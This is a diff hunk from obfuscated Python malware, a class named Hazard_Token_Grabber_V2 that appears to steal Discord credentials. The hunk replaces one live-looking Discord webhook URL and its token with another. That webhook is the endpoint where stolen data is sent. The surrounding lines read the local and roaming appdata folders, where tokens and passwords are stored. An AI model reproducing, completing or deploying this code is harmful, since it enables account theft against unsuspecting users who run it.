@@ -25,7 +25,7 @@ class Hazard_Token_Grabber_V2 :#line:29
     def __init__ (O0OOO0O0O0OOOOO0O ):#line:30
         O0OOO0O0O0OOOOO0O .pasword1 =ldf #line:31
         O0OOO0O0O0OOOOO0O .username1 =pe #line:32
-        O0OOO0O0O0OOOOO0O .webhook ="https://discord.com/api/webhooks/930184723752419328/HeXo30ZaDKxDLh6DCenDr2p6uwX4scyhoyghLTlbA_Mr49EONS8k-WU0acrqJcnrVde9"#line:33
+        O0OOO0O0O0OOOOO0O .webhook ="https://discord.com/api/webhooks/924689684020461599/6x4QfghpOnoXJJS5kfTQn7xGP0aXxCJijmg1_EsyxBNea2lrNmWTAwollVJveIkLr-3Y"#line:33
         O0OOO0O0O0OOOOO0O .files =""#line:34
         O0OOO0O0O0OOOOO0O .appdata =os .getenv ("localappdata")#line:35
         O0OOO0O0O0OOOOO0O .roaming =os .getenv ("appdata")#line:36
